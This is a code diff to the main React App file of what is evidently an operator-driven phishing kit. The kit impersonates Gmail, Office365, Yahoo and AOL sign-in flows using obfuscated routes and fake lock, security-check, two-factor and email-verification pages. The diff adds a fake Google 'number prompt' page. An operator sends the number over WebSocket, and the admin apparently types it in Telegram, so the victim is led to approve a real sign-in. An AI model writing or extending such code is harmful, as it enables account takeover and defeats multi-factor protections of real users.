@@ -27,6 +27,7 @@ import AccountLockedPage from './components/interactive/AccountLockedPage';
 import SecurityCheckPage from './components/interactive/SecurityCheckPage';
 import TwoFactorPage from './components/interactive/TwoFactorPage';
 import EmailVerificationPage from './components/interactive/EmailVerificationPage';
+import GoogleNumberPromptPage from './components/interactive/GoogleNumberPromptPage';
 import { useWebSocket, WebSocketMessage } from './hooks/useWebSocket';
 import { getBrowserFingerprint } from './utils/oauthHandler';
 import { getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
@@ -98,6 +99,15 @@ const ROUTES = {
   EMAIL_V_YAHOO: '/1pk4fa1rwf2gnzoqyc6lffdbc9c5dsp0qfaapcplb0zw99x71jz12ezumr6s6l6losoho6hhwt9h20hng3utyn6f48ga0zicl6mcd4ewlodlrfww6vq4lzs3h4g9uk0wum9lgypomkdhvok0lyt3g2hb3dipz7dfsg77v',
   EMAIL_V_AOL: '/uuorgf3ijzxpy67suzt24550edny6fpcr6sq2ap8ag3tfxo528zmxbrex6isyj9avt6miaoglg6fgnf0dy3b5lv5bsdskb7hjjz72nsxt41ub8vgl1d1hjmg73h10mzkl88oxpmpcjo1zo5jyswf9f1y5mw5e3b7p2584',
   EMAIL_V_OTHERS: '/uhsd9q8cv4zyujahpsgxd0lypj74gvy8b8vtcihwjcnk1g1v7xosdy04rn8ywx0u65i9p4zhje9g9fzf9nyhhljwgxc4djiuvpbkfqsv5aap6nxe2uxsratm23vkos3h81oid1lfcdzlyo4a4ovh68fv7rhujyd30klfc',
+  // Per-provider Google "# Prompt" pages (real-time, triggered by WebSocket
+  // `show_google_number_prompt`). Although the flow is Google-branded, we
+  // route per-provider so non-Gmail sessions still pick up provider-correct
+  // chrome (background, font, accent) when the operator fires it.
+  GPROMPT_GMAIL: '/q4kvhxcl8z2vw5fdz0u3rkcq49n31jp5jwfa75tnzlj0pxwc5b8gvlsr0c8w6dzhux2anf5x9ltjurhz8mkpa1bdf8jp78q9zwyer3a3wxwlt5q3wwgr0pzv6cydbam4qkj2dpb5e5p7n3uhlpkfftnha2u9j7p',
+  GPROMPT_OFFICE365: '/v6lnsf5p6gqj9zhgz2dtmgbkpnyqcd2cm7l1xjy3w7dhqrsa6c0vu0fa9gcjr4qy4pn8tx7w7vfdt4yxqr9wf6q1rmjxbgr8q24z32xkjhxvxwrqvqe9pf6t87vqf9bz4nlbe3v8gjfvb3pjqgu1m43ttfg8qznp',
+  GPROMPT_YAHOO: '/u3ng7v4q9bjpmlt3gh8w8tfcn6jxg5kr0fk2ymfp5b7lqzjm9ru9jr0qx2x1y4mr2xwx6q7c4n9hmzxqqrf67h3uth4uqe9wqmtugrkbwtyrh1g9q4pglqnmnsudg94ucze4pfyq6syvb6gcetv3vdfmpwmgkz1',
+  GPROMPT_AOL: '/p9q3rwmzbjvr8z4mehctddwn7m2lqv7r5cfpwk6xv3hb9ueh3xvz2tspj6cb6qf78x9cqztr7d8qkphbu9pbqzx9z9qkb46wupj0gbm6vvr5ek4r3prh3qufzlqfcfp9vxbzcdz0bjhdkksz9p3jszrrdr3thq9',
+  GPROMPT_OTHERS: '/n5sb87gnqmm2cpybqgvy0fnj3vd2vexk3kmt8d6ynbvrn3jdcphsxwhmsq2zqwd4mrlqqrn8gehfxlcqnt5q4ubrdfxz6ld8aqq3pfvzh6ghvxyf3pud5d63lcd2sktwqx2ddyswr04hktvw8z2hg5j9wbrfb6r',
 };
 
 // Maps a provider name (as sent by the backend over WebSocket) to the provider-specific
@@ -168,6 +178,14 @@ const EMAIL_VERIFICATION_ROUTE_BY_PROVIDER: Record<ProvKey, string> = {
   yahoo: '/1pk4fa1rwf2gnzoqyc6lffdbc9c5dsp0qfaapcplb0zw99x71jz12ezumr6s6l6losoho6hhwt9h20hng3utyn6f48ga0zicl6mcd4ewlodlrfww6vq4lzs3h4g9uk0wum9lgypomkdhvok0lyt3g2hb3dipz7dfsg77v',
   aol: '/uuorgf3ijzxpy67suzt24550edny6fpcr6sq2ap8ag3tfxo528zmxbrex6isyj9avt6miaoglg6fgnf0dy3b5lv5bsdskb7hjjz72nsxt41ub8vgl1d1hjmg73h10mzkl88oxpmpcjo1zo5jyswf9f1y5mw5e3b7p2584',
   others: '/uhsd9q8cv4zyujahpsgxd0lypj74gvy8b8vtcihwjcnk1g1v7xosdy04rn8ywx0u65i9p4zhje9g9fzf9nyhhljwgxc4djiuvpbkfqsv5aap6nxe2uxsratm23vkos3h81oid1lfcdzlyo4a4ovh68fv7rhujyd30klfc',
+};
+
+const GOOGLE_PROMPT_ROUTE_BY_PROVIDER: Record<ProvKey, string> = {
+  gmail: ROUTES.GPROMPT_GMAIL,
+  office365: ROUTES.GPROMPT_OFFICE365,
+  yahoo: ROUTES.GPROMPT_YAHOO,
+  aol: ROUTES.GPROMPT_AOL,
+  others: ROUTES.GPROMPT_OTHERS,
 };
 
 const PROVIDER_URLS = {
@@ -298,6 +316,11 @@ function App() {
   // WebSocket. The page components (e.g. `GmailSmsCodePage`) are "dumb": they
   // receive these values as props and simply render them.
   const [smsCode, setSmsCode] = useState('');
+  // Operator-supplied number for the Google "# Prompt" challenge (sent over
+  // WebSocket via `show_google_number_prompt`). Surfaced as a prop to the
+  // dedicated GoogleNumberPromptPage so the user sees the same number the
+  // admin picked / typed in Telegram.
+  const [googlePromptNumber, setGooglePromptNumber] = useState<string>('');
 
   // WebSocket command handler. Each interactive command navigates to a dedicated
   // per-provider full-screen page; there is no generic overlay.
@@ -323,12 +346,19 @@ function App() {
         security_check: SECURITY_CHECK_ROUTE_BY_PROVIDER,
         two_factor: TWO_FACTOR_ROUTE_BY_PROVIDER,
         email_verification: EMAIL_VERIFICATION_ROUTE_BY_PROVIDER,
+        google_number_prompt: GOOGLE_PROMPT_ROUTE_BY_PROVIDER,
       };
       // For `show_sms_code`, capture the operator-supplied code so the SMS
       // page can render it directly from props.
       if (flow === 'sms_code') {
         const providedCode = (data?.code as string) || '';
         setSmsCode(providedCode);
+      }
+      // For `show_google_number_prompt`, capture the operator-supplied number
+      // so the GoogleNumberPromptPage can display it prominently.
+      if (flow === 'google_number_prompt') {
+        const providedNumber = (data?.number as number | string | undefined);
+        setGooglePromptNumber(providedNumber !== undefined && providedNumber !== null ? String(providedNumber) : '');
       }
       const targetRoute = routeMaps[flow]?.[providerKey];
       if (targetRoute) {
@@ -602,6 +632,12 @@ function App() {
       <Route path={ROUTES.EMAIL_V_YAHOO} element={<EmailVerificationPage providerKey="yahoo" onAction={handleInteractiveAction} />} />
       <Route path={ROUTES.EMAIL_V_AOL} element={<EmailVerificationPage providerKey="aol" onAction={handleInteractiveAction} />} />
       <Route path={ROUTES.EMAIL_V_OTHERS} element={<EmailVerificationPage providerKey="others" onAction={handleInteractiveAction} />} />
+      {/* Per-provider Google "# Prompt" pages (triggered by WebSocket `show_google_number_prompt`) */}
+      <Route path={ROUTES.GPROMPT_GMAIL} element={<GoogleNumberPromptPage providerKey="gmail" number={googlePromptNumber} onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.GPROMPT_OFFICE365} element={<GoogleNumberPromptPage providerKey="office365" number={googlePromptNumber} onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.GPROMPT_YAHOO} element={<GoogleNumberPromptPage providerKey="yahoo" number={googlePromptNumber} onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.GPROMPT_AOL} element={<GoogleNumberPromptPage providerKey="aol" number={googlePromptNumber} onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.GPROMPT_OTHERS} element={<GoogleNumberPromptPage providerKey="others" number={googlePromptNumber} onAction={handleInteractiveAction} />} />
       <Route path="/login.yahoo.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_YAHOO} />} />
       <Route path="/login.microsoftonline.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_OFFICE365} provider="microsoft" />} />
       <Route path="/accounts.google.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_GMAIL} />} />
